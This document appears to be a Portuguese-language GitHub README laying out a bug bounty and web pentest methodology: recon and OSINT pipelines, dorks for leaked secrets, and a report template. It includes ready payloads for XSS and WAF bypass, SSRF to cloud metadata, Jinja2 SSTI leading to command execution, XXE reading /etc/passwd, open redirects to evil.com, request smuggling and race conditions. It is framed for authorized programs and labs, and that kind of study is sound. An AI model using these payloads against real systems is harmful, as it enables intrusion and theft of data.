# 🕷️ Bug Bounty & Pentest Web — Metodologia Completa

> *"Script kiddies copiam comandos. Hackers leem o código fonte e entendem o protocolo."*

Repositório unificado de metodologia, ferramentas e conhecimento avançado para **Bug Bounty** e **Web Hacking**. Cobre desde o ecossistema e a arquitetura do mercado, passando pelo recon básico e avançado, até vetores de exploração, automação, lógica de negócio, triagem e estrutura de relatórios.

> ⚠️ Todo conteúdo aqui é utilizado estritamente em plataformas autorizadas (Bugcrowd, HackerOne, Intigriti) ou ambientes de laboratório (PortSwigger, Hack The Box, OverTheWire).

---

## 📁 Estrutura

```
bug-bounty-methodology/
├── 01-ecosystem/       # Ecossistema, SDLC, plataformas e mercado
├── 02-recon/           # Reconhecimento passivo, ativo e OSINT
├── 03-exploitation/    # Vetores de ataque avançados
├── 04-automation/      # Pipelines, VPS e monitoramento contínuo
├── 05-reports/         # Templates e estrutura de relatórios
└── README.md
```

---

## 📑 Índice

- [1. O Ecossistema de Bug Bounty](#1-o-ecossistema-de-bug-bounty)
  - [1.1 A Evolução do SDLC e o Teste Ofensivo Contínuo](#11-a-evolução-do-sdlc-e-o-teste-ofensivo-contínuo)
  - [1.2 Infraestrutura Laboratorial e Arsenal](#12-infraestrutura-laboratorial-e-arsenal)
- [2. Fase 0 — Recon Básico (Pipeline CLI)](#2-fase-0--recon-básico-pipeline-cli)
- [3. Fase 1 — OSINT e Cloud](#3-fase-1--osint-e-cloud)
- [4. Fase 2 — Reconhecimento Contínuo e Profundo](#4-fase-2--reconhecimento-contínuo-e-profundo)
- [5. Fase 3 — Content Discovery e APIs](#5-fase-3--content-discovery-e-apis)
- [6. Fase 4 — Vetores Avançados (Burp Suite)](#6-fase-4--vetores-avançados-burp-suite)
- [7. Fase 5 — Bypasses e Evasão de WAF](#7-fase-5--bypasses-e-evasão-de-waf)
- [8. Fase 6 — Automação e Monitoramento Contínuo](#8-fase-6--automação-e-monitoramento-contínuo)
- [9. OWASP, Ferramentas e Triagem](#9-owasp-ferramentas-e-triagem)
- [10. Falhas de Lógica de Negócio](#10-falhas-de-lógica-de-negócio)
- [11. O Relatório Perfeito](#11-o-relatório-perfeito)
- [12. Plataformas e Recursos](#12-plataformas-e-recursos)

---

## 1. O Ecossistema de Bug Bounty

### 1.1 A Evolução do SDLC e o Teste Ofensivo Contínuo

A segurança da informação passou por uma metamorfose estrutural significativa nas últimas duas décadas. Modelos tradicionais de testes de intrusão (penetration testing), que dependiam de análises pontuais e limitadas por escopo de tempo geográfico ou cronológico, mostraram-se insuficientes para acompanhar a agilidade dos ciclos de desenvolvimento de software modernos (SDLC).

A resposta da indústria global para essa assimetria tecnológica foi a adoção em larga escala de **programas de recompensa por identificação de vulnerabilidades (Bug Bounty)**, alavancando a inteligência coletiva de uma comunidade massiva de pesquisadores de segurança (hackers éticos) para auditar continuamente as superfícies de ataque expostas.

**O ciclo de vida de gerenciamento de vulnerabilidades de alta maturidade:**

1. **Inventário rigoroso de ativos** via EASM (External Attack Surface Management) — mapeamento proativo de domínios, subdomínios expostos, propriedades de IP e serviços de nuvem não documentados (Shadow IT)
2. **Descoberta de vulnerabilidades** através de PTaaS (Pentest as a Service) integrados a campanhas de recompensas
3. **Priorização e centralização** das descobertas, roteando vetores críticos diretamente para as equipes de engenharia para correção imediata

**Evidências da eficácia do modelo:**
- Programa corporativo do **TikTok**: identificou e resolveu milhares de vulnerabilidades, desembolsando mais de **$400.000** em recompensas em um único evento ao vivo, e contabilizando quase **$3 milhões** em pagamentos totais
- **Adobe** baseia sua segurança ofensiva na plataforma HackerOne por mais de uma década

### 1.2 Infraestrutura Laboratorial e Arsenal

A eficácia na caça a vulnerabilidades web depende intrinsecamente do preparo arquitetônico do ambiente de testes. O princípio fundamental reside na execução de avaliações operacionais de maneira **legalizada, fluida e isolada**.

**Distribuições recomendadas:**
- **Kali Linux** — padrão da indústria, repositório pré-compilado de ferramentas ofensivas
- **Parrot Security OS** — alternativa leve e completa

**Filosofia Minimalista:** Pesquisadores avançados frequentemente preferem instalar apenas as ferramentas necessárias ao invés de distribuições completas, mantendo o ambiente enxuto, rápido e controlado. Ambientes virtuais (VMware Workstation, VirtualBox) e máquinas vulneráveis dedicadas (HTB, VulnHub, DVWA) complementam o laboratório.

---

## 2. Fase 0 — Recon Básico (Pipeline CLI)

### Pipeline Principal

```
subfinder → httpx → gau → grep → nuclei
```

### Descoberta de Hosts Ativos

```bash
# Verificar hosts online e salvar
cat subdomains.txt | httpx -silent > alive.txt

# Limitar threads e rate (evitar sobrecarga / ban)
httpx -threads 20 -rate-limit 50

# Filtrar por status 200 apenas
httpx -mc 200

# Combinando: subdomínios + verificação + detecção de tecnologia
cat subdomains.txt | httpx -silent -title -tech-detect -status-code -threads 50
```

> **Códigos de status que importam:**
> - `403` = WAF forte, mas o recurso existe — tente bypass
> - `401` = Autenticação necessária — busque credenciais expostas
> - `404` = Não encontrado — mas pode ser falso negativo com path manipulation
> - `200` = Ativo e respondendo

### Coleta de URLs Históricas

```bash
# Coletar URLs históricas via Wayback Machine + outras fontes
gau dominio.com > urls.txt
waybackurls dominio.com >> urls.txt

# Remover duplicatas
sort -u urls.txt > clean_urls.txt
```

### Filtragem de Parâmetros

```bash
# Extrair URLs com parâmetros (potencialmente injetáveis)
cat urls.txt | grep "=" > params.txt

# Remover duplicatas
sort -u params.txt > clean_params.txt

# Focar nos parâmetros críticos de alto impacto
grep -E "id=|user=|token=|redirect=|url=|file=|path=|cmd=|exec=" clean_params.txt > juicy.txt
```

### Testes Manuais Rápidos

```
# IDOR — Teste direto de referência de objeto
?id=123 → ?id=124 → ?id=125

# XSS — Injeção básica
?q=<script>alert(1)</script>
?q="><img src=x onerror=alert(1)>

# Open Redirect
?redirect=https://evil.com
?next=//evil.com
?url=javascript:alert(1)
```

---

## 3. Fase 1 — OSINT e Cloud

### Mapeamento de Aquisições e ASN

```bash
# Mapear organização e ASNs associados
amass intel -org "Nome da Empresa"

# Complementar com BGPView, he.net, Shodan
# Objetivo: descobrir IPs, CIDRs e subsidiárias fora do escopo aparente
```

### Cloud Buckets Expostos

```bash
# Ferramenta: cloud_enum
python3 cloud_enum.py -k targetname

# Google Dorks para S3
site:s3.amazonaws.com "target"
site:storage.googleapis.com "target"
site:blob.core.windows.net "target"

# Arquivos que valem ouro quando encontrados publicamente
.sql, .bak, .pem, .env, .key, .pfx, .p12, .conf
```

### Dorking Avançado

```bash
# GitHub — Segredos em código
org:TargetName "password"
org:TargetName "AWS_ACCESS_KEY_ID"
org:TargetName "api_key"
org:TargetName "secret" extension:env
org:TargetName filename:.env

# Shodan — Infraestrutura exposta
ssl:"target.com" port:8080,9200,6379,27017,5432
org:"Target Inc" port:22

# Google Dorks
site:target.com filetype:pdf confidential
site:target.com inurl:admin
site:target.com intitle:"Index of"
```

---

## 4. Fase 2 — Reconhecimento Contínuo e Profundo

### Enumeração Passiva

```bash
# Subfinder (fontes públicas + certificados SSL)
subfinder -d target.com -all -silent > passive.txt

# Certificate Transparency Logs
curl -s "https://crt.sh/?q=%.target.com&output=json" | \
  jq -r '.[].name_value' | \
  sed 's/*.//' | \
  sort -u >> passive.txt
```

### Permutações e Bruteforce DNS

```bash
# Gerar permutações inteligentes
gotator -sub passive.txt -perm /path/to/wordlist.txt -depth 1 -mindepth 1 -md > perms.txt

# Resolução massiva de DNS (verificar o que realmente existe)
cat passive.txt perms.txt | sort -u | puredns resolve resolvers.txt > resolved.txt
```

### Scan de Portas e Fingerprinting

```bash
# Descoberta massiva de portas abertas
naabu -l resolved.txt -p - -silent -c 1000 -o open_ports.txt

# Validar quais são serviços web e coletar metadados
cat open_ports.txt | httpx -silent -title -tech-detect -status-code -cdn -threads 50 > alive_web.txt
```

---

## 5. Fase 3 — Content Discovery e APIs

### Fuzzing de Diretórios e Endpoints

```bash
# FFuf — Fuzzing rápido e configurável
ffuf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
     -u https://target.com/FUZZ \
     -mc 200,301,302,403 \
     -t 50

# Gobuster — Alternativa estável
gobuster dir -u https://target.com \
             -w /usr/share/wordlists/dirb/common.txt \
             -b 404 \
             -t 50
```

### Mapeamento de APIs

```bash
# Buscar documentação exposta
/swagger.json
/api/v1/docs
/api-docs
/openapi.json
/.well-known/
/v1/
/v2/

# GraphQL — Testar Introspection
POST /graphql
{"query": "{__schema{types{name}}}"}

# Ferramentas
# InQL (Burp Suite Extension)
# Clairvoyance (para GraphQL sem Introspection)
```

### Análise de JavaScript

```bash
# Baixar todos os arquivos .js
gau target.com | grep "\.js$" > js_files.txt
waybackurls target.com | grep "\.js$" >> js_files.txt
sort -u js_files.txt > unique_js.txt

# Buscar endpoints e segredos nos JS
cat unique_js.txt | while read url; do
  curl -s "$url" | grep -oE '(https?://[^\s"]+|/api/[^\s"]+)' 
done | sort -u > endpoints_from_js.txt

# Buscar secrets com Trufflehog
trufflehog filesystem ./
nuclei -t http/exposures/tokens/ -l unique_js.txt
```

> **Source Maps (`.js.map`):** Permitem reconstruir o código TypeScript/Vue/React sem ofuscação — sempre verificar se estão expostos em produção.

---

## 6. Fase 4 — Vetores Avançados (Burp Suite)

### 🔓 IDOR / BOLA (Broken Object Level Authorization)

```
# Vetores além do GET
# Testar em PUT, PATCH e DELETE também

# Injeção em arrays (Mass Assignment)
{"user_id": [123, 456]}

# Mass Assignment — injetar campos privilegiados
{"role":"admin", "is_vip":true, "is_admin":true}

# IDOR em parâmetros não óbvios
X-User-ID: 456
X-Account-ID: 789
Referer: /users/456/dashboard

# IDOR indireto — alterar referências em body JSON
{"owner_id": 456, "target_user": "victim@email.com"}
```

### 🔀 SSRF (Server-Side Request Forgery)

```
# Parâmetros de alto valor
?image_url=
?webhook=
?callback=
?redirect=
?url=
?fetch=
?load=

# Blind SSRF — usar Burp Collaborator ou interactsh
?image_url=https://your-collaborator-id.oastify.com

# Escalação para metadados de Cloud (AWS)
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://169.254.169.254/latest/meta-data/ami-id

# Bypass de filtros
http://[::1]/
http://127.0.0.1@evil.com/
http://2130706433/ (127.0.0.1 em decimal)
```

### 🔑 JWT e OAuth

```
# JWT — Algoritmos fracos
# Mudar "alg": "RS256" para "alg": "none" e remover assinatura
# HS256 com secret fraco — brute-force com hashcat:
hashcat -a 0 -m 16500 token.jwt /usr/share/wordlists/rockyou.txt

# OAuth — Vetores clássicos
# Bypass de redirect_uri com redirect_uri=https://evil.com
# Falta de state parameter = CSRF no login (Account Takeover)
# Authorization Code Interception via Referer header
```

### ☠️ Cache Poisoning / Cache Deception

```
# Cache Poisoning — Envenenar cache com headers
X-Forwarded-Host: evil.com
X-Forwarded-Scheme: nothttps
X-Original-URL: /admin

# Cache Deception — Enganar cache para armazenar dados privados
# Acessar: /my_profile/dashboard.css
# Se a resposta contiver dados do perfil e for cacheada como estático, 
# qualquer usuário que acessar a mesma URL obterá seus dados privados
```

### 🧱 HTTP Request Smuggling

```
# Dessincronização entre Frontend (proxy/CDN) e Backend
# Impacto: bypass de WAF, captura de requisições de outros usuários

# CL.TE (Content-Length usado pelo Frontend, Transfer-Encoding pelo Backend)
POST / HTTP/1.1
Content-Length: 6
Transfer-Encoding: chunked

0

X

# Ferramenta: HTTP Request Smuggler (Burp Suite Extension)
# Tipos: CL.TE, TE.CL, TE.TE
```

### 💉 SSTI (Server-Side Template Injection)

```
# Detecção — Injetar expressões matemáticas nos parâmetros
${7*7}     → Resultado: 49? → SSTI confirmado (Jinja2, Twig, etc.)
{{7*7}}    → Resultado: 49? → SSTI confirmado (Jinja2, Pebble)
<%= 7*7 %> → Resultado: 49? → SSTI confirmado (ERB/Ruby)

# Escalação para RCE (Jinja2 / Python)
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}

# Ferramenta: tplmap
python3 tplmap.py -u "https://target.com/?name=test"
```

### 💣 XXE (XML External Entity)

```xml
<!-- Ler arquivo local -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>

<!-- XXE via SSRF -->
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Dica: Content-Type: application/xml → tentar converter requests JSON para XML -->
```

---

## 7. Fase 5 — Bypasses e Evasão de WAF

### Bypass de 403

```bash
# Headers de IP spoofing
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Originating-IP: 127.0.0.1
True-Client-IP: 127.0.0.1
CF-Connecting-IP: 127.0.0.1

# Path manipulation
/admin        → /%2e/admin
/admin        → /admin/
/admin        → //admin//
/admin        → /ADMIN
/admin        → /admin.json
/admin        → /admin;param=1
```

### Bypass de XSS com WAF

```html
<!-- Codificação e variações -->
<ScRiPt>alert(1)</ScRiPt>
<script>alert`1`</script>
<script>alert(String.fromCharCode(88,83,83))</script>

<!-- Tags exóticas (sem script) -->
<details open ontoggle=alert(1)>
<body onload=alert(1)>
<svg onload=alert(1)>
<input autofocus onfocus=alert(1)>
<img src=x onerror=alert(1)>

<!-- JavaScript Protocol -->
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

## 8. Fase 6 — Automação e Monitoramento Contínuo

### Pipeline em VPS (Execução Automática)

```bash
#!/bin/bash
# recon.sh — Pipeline automatizado de reconhecimento
TARGET=$1
DATE=$(date +%Y-%m-%d)
OUTPUT_DIR="/home/user/recon/$TARGET/$DATE"
mkdir -p $OUTPUT_DIR

# 1. Enumeração de subdomínios
subfinder -d $TARGET -all -silent > $OUTPUT_DIR/passive.txt
echo "[+] Subfinder: $(wc -l < $OUTPUT_DIR/passive.txt) subdomínios"

# 2. Resolução DNS
puredns resolve resolvers.txt < $OUTPUT_DIR/passive.txt > $OUTPUT_DIR/resolved.txt

# 3. Verificação de hosts ativos
cat $OUTPUT_DIR/resolved.txt | httpx -silent -title -tech-detect -status-code \
  > $OUTPUT_DIR/alive.txt
echo "[+] Alive: $(wc -l < $OUTPUT_DIR/alive.txt) hosts ativos"

# 4. Varredura com Nuclei
nuclei -l $OUTPUT_DIR/alive.txt -t nuclei-templates/ -severity medium,high,critical \
  -o $OUTPUT_DIR/nuclei_results.txt
echo "[+] Nuclei: $(wc -l < $OUTPUT_DIR/nuclei_results.txt) resultados"
```

```bash
# Crontab — Rodar todo dia às 3h
0 3 * * * /home/user/recon.sh target.com >> /home/user/logs/recon.log 2>&1
```

### Monitoramento de Novos Subdomínios

```bash
# Diffing de subdomínios (detectar novos = potencial attack surface)
comm -13 <(sort ontem.txt) <(sort hoje.txt) > novos.txt

# Notificação via Discord/Telegram
if [ -s novos.txt ]; then
  cat novos.txt | notify -provider discord -bulk
fi
```

---

## 9. OWASP, Ferramentas e Triagem

### Arsenal Principal

| Categoria | Ferramenta | Uso Principal |
|-----------|-----------|--------------|
| **Proxy** | Burp Suite | Interceptar e modificar tráfego HTTP/HTTPS |
| **Proxy Alternativo** | OWASP ZAP | Scanner automático + proxy |
| **Fuzzing Web** | FFuf, Gobuster | Descobrir diretórios e endpoints ocultos |
| **Port Scan** | Nmap, Masscan, Naabu | Mapear portas e serviços |
| **Vuln Scan** | Nuclei | Templates YAML para falhas conhecidas |
| **Vuln Scan Legacy** | Nikto | Scanner clássico de aplicações web |
| **SQL Injection** | SQLMap | Exploração automatizada de SQLi |
| **Fingerprint Web** | Wappalyzer, WhatWeb | Identificar stack tecnológico |
| **Reconhecimento** | Shodan, Censys, FOFA | IPs expostos, certificados, banners |
| **Subdomains** | Subfinder, Amass | Enumeração passiva e ativa |
| **DNS Bruteforce** | PureDNS, dnsx | Resolução massiva validada |
| **URL Collection** | Gau, Waybackurls | Histórico de URLs do alvo |
| **Secrets** | Trufflehog, gitleaks | Vazamento de chaves e senhas |
| **SSRF/OOB** | Burp Collaborator, interactsh | Detecção de SSRF blind e XXE |
| **JWT** | jwt.io, hashcat | Análise e ataque de tokens JWT |

### OWASP Top 10 — Foco em Bug Bounty

| # | Vuln | Impacto | Técnica |
|---|------|---------|---------|
| A01 | Broken Access Control (IDOR) | Acesso a dados de outros usuários | Alterar IDs em requisições GET/POST/PUT |
| A02 | Cryptographic Failures | Exposição de dados sensíveis | Secrets em JS, JWT fraco, HTTP sem TLS |
| A03 | Injection (SQLi, LFI, RCE) | Comprometimento total | Payloads em parâmetros, headers e cookies |
| A04 | Insecure Design | Falhas arquiteturais não patcháveis | Lógica de negócio, fluxos quebrados |
| A05 | Security Misconfiguration | Painéis expostos, debug ativo | Google Dorks, Shodan, headers |
| A06 | Vulnerable Components | RCE via biblioteca desatualizada | CVE search, nuclei templates |
| A07 | Authentication Failures | Takeover de conta | Brute force, credential stuffing, bypass |
| A08 | Software & Data Integrity | Supply chain attack | Dependências, CI/CD comprometido |
| A09 | Logging Failures | Ataques não detectados | Falta de logs, alertas insuficientes |
| A10 | SSRF | Acesso à infra interna/cloud | Parâmetros de URL, imports, webhooks |

---

## 10. Falhas de Lógica de Negócio

As falhas de lógica de negócio representam aproximadamente **45% do orçamento de recompensas** em plataformas top-tier. Não aparecem no OWASP Top 10 de forma explícita porque são específicas de cada aplicação.

### Categorias Principais

**Client-Side Trust — Nunca confiar em dados do cliente:**
```
# Modificar preço/desconto via proxy antes do envio
{"price": 0.01, "quantity": 99, "product_id": "premium_plan"}

# Modificar campos ocultos que controlam acesso
<input type="hidden" name="is_admin" value="true">
```

**Workflow Bypass — Pular etapas obrigatórias:**
```
# Acessar a URI final de um fluxo sem completar os passos anteriores
# Ex: Ir direto para /checkout/confirm sem passar por /checkout/payment
GET /order/confirm?order_id=12345
```

**Race Condition (TOCTOU — Time Of Check To Time Of Use):**
```python
# Enviar múltiplas requisições paralelas antes do lock do banco de dados
import threading
import requests

def redeem_coupon():
    r = requests.post('/api/coupon/redeem', json={"code": "DISCOUNT50"}, 
                      headers={"Cookie": "session=victim"})
    print(r.status_code, r.json())

# Disparar 20 requisições simultâneas
threads = [threading.Thread(target=redeem_coupon) for _ in range(20)]
for t in threads: t.start()
for t in threads: t.join()
```

**Casos clássicos de Race Condition:**
- Usar um cupom mais de uma vez
- Transferir mais dinheiro do que existe na conta
- Votar mais de uma vez
- Criar mais recursos do que o plano permite

---

## 11. O Relatório Perfeito

A qualidade do relatório determina a recompensa recebida. Um relatório bem estruturado demonstra profissionalismo e maximiza as chances de triagem rápida e paga.

### Template de Relatório

```markdown
## Título
[Tipo de vuln] via [localização] em [endpoint/funcionalidade] — [Severidade]

**Exemplo:** RCE via SSTI no parâmetro `template` em /api/export — Critical

---

## Resumo
Descrição clara e concisa da vulnerabilidade, contexto e impacto potencial em 2-3 frases.

---

## Severidade
- **CVSS Score:** 9.8 (Critical)
- **CWE:** CWE-94 (Code Injection)

---

## Passo a Passo para Reprodução (PoC)

**Pré-requisitos:**
- Conta registrada no sistema
- Burp Suite ou curl

**Passos:**
1. Faça login em https://target.com/login
2. Acesse https://target.com/api/export
3. Intercepte a requisição com Burp Suite
4. Modifique o parâmetro `template` para: `{{7*7}}`
5. Envie a requisição
6. Observe a resposta retornando `49` — confirmando SSTI

**Request:**
\`\`\`http
POST /api/export HTTP/1.1
Host: target.com
Content-Type: application/json

{"format":"pdf","template":"{{7*7}}"}
\`\`\`

**Response:**
\`\`\`json
{"output":"49","status":"success"}
\`\`\`

---

## Impacto
- Execução remota de código no servidor (RCE)
- Leitura de arquivos sensíveis (/etc/passwd, variáveis de ambiente)
- Potencial comprometimento total do servidor e dados de todos os usuários
- Violação de Confidencialidade, Integridade e Disponibilidade (CIA Triad)

---

## Evidências
- [ ] Screenshot da request/response no Burp Suite
- [ ] Vídeo demonstrando o PoC (para bugs mais complexos)
- [ ] Curl equivalente para reprodução rápida

---

## Mitigação Sugerida
Implementar sanitização e escape adequados de entradas do usuário antes de passá-las ao motor de template. Considerar o uso de sandboxes de template com restrições de acesso ao ambiente Python.
```

### Regras de Ouro

- ✅ **Seja específico:** Inclua requests/responses completos
- ✅ **Mostre o impacto real:** Não é bug se não há impacto demonstrável
- ✅ **Vídeo para bugs complexos:** Especialmente para Race Conditions e multi-step chains
- ❌ **Nunca reporte Self-XSS isolado** — sempre encadeie com CSRF ou outro vetor para Account Takeover
- ❌ **Não exagere na severidade** — ser honesto constrói reputação
- ❌ **Não inclua dados de outros usuários** sem autorização explícita

---

## 12. Plataformas e Recursos

### Plataformas de Bug Bounty

| Plataforma | Tipo | Foco |
|-----------|------|------|
| [HackerOne](https://hackerone.com) | Pública/Privada | Enterprise, amplo escopo |
| [Bugcrowd](https://bugcrowd.com) | Pública/Privada | Variado, bom para iniciantes |
| [Intigriti](https://intigriti.com) | Pública/Privada | Europa, pagamentos em EUR |
| [YesWeHack](https://yeswehack.com) | Pública/Privada | Europa, crescendo |
| [Synack](https://synack.com) | Privada (vetted) | Alta remuneração, processo seletivo |

### Plataformas de Prática

- [Hack The Box](https://hackthebox.com) — Labs de pentest realísticos
- [OverTheWire](https://overthewire.org) — Wargames e CTFs progressivos
- [PortSwigger Web Academy](https://portswigger.net/web-security) — Labs gratuitos focados em web
- [VulnHub](https://vulnhub.com) — VMs vulneráveis para download
- [TryHackMe](https://tryhackme.com) — Plataforma guiada, ótima para iniciantes
- [DVWA](https://github.com/digininja/DVWA) — Damn Vulnerable Web Application (local)

### Recursos Contínuos

- 📰 Newsletter: **tl;dr sec** — curadoria semanal de segurança
- 📰 Newsletter: **Bug Bounty Reports Explained** — análise de relatórios reais
- 🎥 Canal: **NahamSec** — tutoriais e streams de bug bounty
- 🎥 Canal: **LiveOverflow** — low-level e CTFs
- 💬 Comunidade: Discord de Bug Bounty BR
- 📚 Referência: [HackerOne Hacktivity](https://hackerone.com/hacktivity) — relatórios públicos divulgados

### Certificações Recomendadas

| Nível | Certificação | Foco |
|-------|-------------|------|
| Iniciante | CEH, PNPT | Fundamentos ofensivos |
| Intermediário | OSCP, CPTS | Pentest prático completo |
| Avançado Web | eWPTX, BSCP | Web hacking avançado |
| Avançado Evasion | OSEP | Evasão, post-exploitation |

---

<div align="center">

🚩 **CTF Player | Bug Bounty Hunter | Web Security Researcher**

[![Kali](https://img.shields.io/badge/Kali-268BEE?style=for-the-badge&logo=kalilinux&logoColor=white)](https://kali.org)
[![Burp Suite](https://img.shields.io/badge/Burp_Suite-FF6633?style=for-the-badge&logo=portswigger&logoColor=white)](https://portswigger.net)
[![Python](https://img.shields.io/badge/Python-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)

*"The quieter you become, the more you are able to hear."*

</div>
